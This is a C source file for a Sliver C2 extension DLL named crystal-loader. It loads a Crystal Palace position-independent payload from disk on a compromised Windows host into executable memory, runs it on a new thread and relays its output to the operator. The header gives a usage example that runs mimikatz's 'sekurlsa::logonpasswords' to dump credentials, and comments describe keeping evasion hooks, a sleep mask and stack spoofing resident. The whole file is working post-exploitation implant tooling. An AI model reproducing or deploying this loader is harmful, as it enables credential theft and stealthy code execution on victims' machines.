/*
 * crystal-loader.c
 *
 * Sliver Extension DLL that loads and executes a Crystal Palace PICO blob
 * inside the Sliver implant memory.
 *
 * Sliver Extension entrypoint contract (matches the Windows extension loader):
 *   int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback)
 *
 * argsBuffer format — Sliver DLL extensions use TEXT format:
 *   "payload=<path_on_target>[|<runtime_args>]"
 *
 *   The '|' separator is optional.  Everything after '|' is passed as
 *   loader_arguments to the PICO's go(), overriding any baked-in args.
 *
 *   Workflow:
 *     upload /kali/mimikatz.pico.bin C:/Windows/Temp/mk.bin
 *     crystal payload=C:/Windows/Temp/mk.bin|sekurlsa::logonpasswords exit
 *
 * PICO entrypoint convention:
 *   The PICO is produced from postex-loader/loader.spec with '+gofirst' so
 *   the symbol 'go' sits at offset 0. Signature:
 *       void go(void *loader_arguments);   (loader_arguments unused: NULL safe)
 *
 * Copyright (c) 2026 Simone Licitra
 * Licensed under the MIT License (see ../../../LICENSE).
 */

#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

#include "beacon_compatibility.h"

#ifndef EXPORT
#define EXPORT __declspec(dllexport)
#endif

typedef int  (*goCallback)(char *, int);
typedef void (*pico_entry_t)(void *);

static void emit(goCallback cb, const char *msg)
{
    if (cb == NULL) return;
    cb((char *)msg, (int)strlen(msg));
}

typedef struct {
    pico_entry_t entry;
    void        *args;
} pico_thread_args_t;

static DWORD WINAPI pico_thread_proc(LPVOID param)
{
    pico_thread_args_t *a = (pico_thread_args_t *)param;
    a->entry(a->args);
    return 0;
}

EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback)
{
    if (argsBuffer == NULL || bufferSize == 0) {
        emit(callback, "[crystal-loader] error: empty argsBuffer\n");
        return 1;
    }

    /*
     * Extract the file path from "payload=<path>".
     * Scan for '=' within the first 64 bytes; bytes before '=' must be
     * valid identifier characters.
     */
    int scan   = (int)bufferSize < 64 ? (int)bufferSize : 64;
    int eq_pos = -1;
    for (int i = 0; i < scan; i++) {
        if ((unsigned char)argsBuffer[i] == '=') { eq_pos = i; break; }
    }
    if (eq_pos < 1 || eq_pos > 32) {
        emit(callback, "[crystal-loader] error: no 'name=path' in argsBuffer\n");
        return 2;
    }
    for (int i = 0; i < eq_pos; i++) {
        unsigned char c = (unsigned char)argsBuffer[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '-')) {
            emit(callback, "[crystal-loader] error: invalid arg name chars\n");
            return 2;
        }
    }

    /* Copy value to a null-terminated buffer; split on '|' for optional runtime args. */
    int   val_start = eq_pos + 1;
    int   val_len   = (int)bufferSize - val_start;
    if (val_len <= 0 || val_len >= MAX_PATH) {
        emit(callback, "[crystal-loader] error: path length invalid\n");
        return 2;
    }

    /* Find optional '|' separator between path and runtime args. */
    int pipe_off = -1;
    for (int i = 0; i < val_len; i++) {
        if ((unsigned char)argsBuffer[val_start + i] == '|') { pipe_off = i; break; }
    }

    int  path_len  = (pipe_off >= 0) ? pipe_off : val_len;
    char path[MAX_PATH];
    memcpy(path, argsBuffer + val_start, (size_t)path_len);
    path[path_len] = '\0';

    /* Runtime args (everything after '|'), or NULL if not provided. */
    char *runtime_args = NULL;
    if (pipe_off >= 0) {
        int args_len = val_len - pipe_off - 1;
        if (args_len > 0) {
            runtime_args = (char *)VirtualAlloc(NULL, (SIZE_T)(args_len + 1),
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
            if (runtime_args) {
                memcpy(runtime_args, argsBuffer + val_start + pipe_off + 1, (size_t)args_len);
                runtime_args[args_len] = '\0';
            }
        }
    }

    {
        char diag[MAX_PATH + 40];
        snprintf(diag, sizeof(diag), "[crystal-loader] reading PICO from: %s\n", path);
        emit(callback, diag);
    }

    /* Open the PICO file on the target. */
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char diag[64];
        snprintf(diag, sizeof(diag),
                 "[crystal-loader] error: CreateFileA failed (%lu)\n",
                 (unsigned long)GetLastError());
        emit(callback, diag);
        return 3;
    }

    LARGE_INTEGER fs = {0};
    if (!GetFileSizeEx(hFile, &fs) || fs.QuadPart <= 0 ||
        fs.QuadPart > 250 * 1024 * 1024) {
        emit(callback, "[crystal-loader] error: bad file size\n");
        CloseHandle(hFile);
        return 3;
    }
    int pico_size = (int)fs.QuadPart;

    /* Allocate a temporary RW buffer to read into, then copy to RWX. */
    BYTE *pico_tmp = (BYTE *)VirtualAlloc(NULL, (SIZE_T)pico_size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (pico_tmp == NULL) {
        emit(callback, "[crystal-loader] error: VirtualAlloc(tmp) failed\n");
        CloseHandle(hFile);
        return 3;
    }

    DWORD bytes_read = 0;
    if (!ReadFile(hFile, pico_tmp, (DWORD)pico_size, &bytes_read, NULL) ||
        (int)bytes_read != pico_size) {
        char diag[64];
        snprintf(diag, sizeof(diag),
                 "[crystal-loader] error: ReadFile failed (%lu)\n",
                 (unsigned long)GetLastError());
        emit(callback, diag);
        VirtualFree(pico_tmp, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 3;
    }
    CloseHandle(hFile);

    {
        char diag[64];
        snprintf(diag, sizeof(diag),
                 "[crystal-loader] read %d bytes OK\n", pico_size);
        emit(callback, diag);
    }

    /* Allocate RWX region and copy the PICO into it. */
    void *pico_mem = VirtualAlloc(NULL, (SIZE_T)pico_size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (pico_mem == NULL) {
        emit(callback, "[crystal-loader] error: VirtualAlloc(RWX) failed\n");
        VirtualFree(pico_tmp, 0, MEM_RELEASE);
        return 3;
    }

    memcpy(pico_mem, pico_tmp, (size_t)pico_size);
    VirtualFree(pico_tmp, 0, MEM_RELEASE);

    emit(callback, "[crystal-loader] executing PICO\n");

    /*
     * Run on a dedicated OS thread — NOT on the calling goroutine thread.
     * The Sliver extension dispatcher calls go() from a Go goroutine.
     * Running the PICO directly on that thread would corrupt Go's goroutine
     * scheduler metadata.  A fresh OS thread guarantees a clean stack.
     */
    pico_thread_args_t thread_args = {
        .entry = (pico_entry_t)pico_mem,
        .args  = runtime_args, /* NULL → use baked args; non-NULL → overrides them */
    };

    HANDLE hThread = CreateThread(NULL, 0, pico_thread_proc, &thread_args, 0, NULL);
    if (hThread == NULL) {
        emit(callback, "[crystal-loader] error: CreateThread failed\n");
        VirtualFree(pico_mem, 0, MEM_RELEASE);
        return 4;
    }

    /*
     * Wait for the PICO's go() to return.  The postex-loader go() returns
     * as soon as DllMain + StartW complete (StartW spawns the beacon goroutine
     * and itself returns immediately).  The beacon goroutine keeps running
     * after this thread exits.
     */
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    /*
     * Drain BeaconOutput/BeaconPrintf accumulator.
     * Post-ex DLLs (mimikatz, enumerators, etc.) write their results into
     * beacon_compatibility_output via BeaconOutput/BeaconPrintf.
     * Forward that buffer to the operator before returning.
     */
    {
        int   out_size = 0;
        char *out_data = BeaconGetOutputData(&out_size);
        if (out_data != NULL && out_size > 0) {
            callback(out_data, out_size);
            free(out_data);
        }
    }

    /*
     * Intentionally NOT freeing pico_mem: Crystal Palace's loader chain
     * keeps hooks, sleep mask, and stack-spoof trampolines resident next
     * to the loaded DLL for the entire beacon lifetime.
     */
    emit(callback, "[crystal-loader] PICO returned\n");
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;
    (void)fdwReason;
    return TRUE;
}
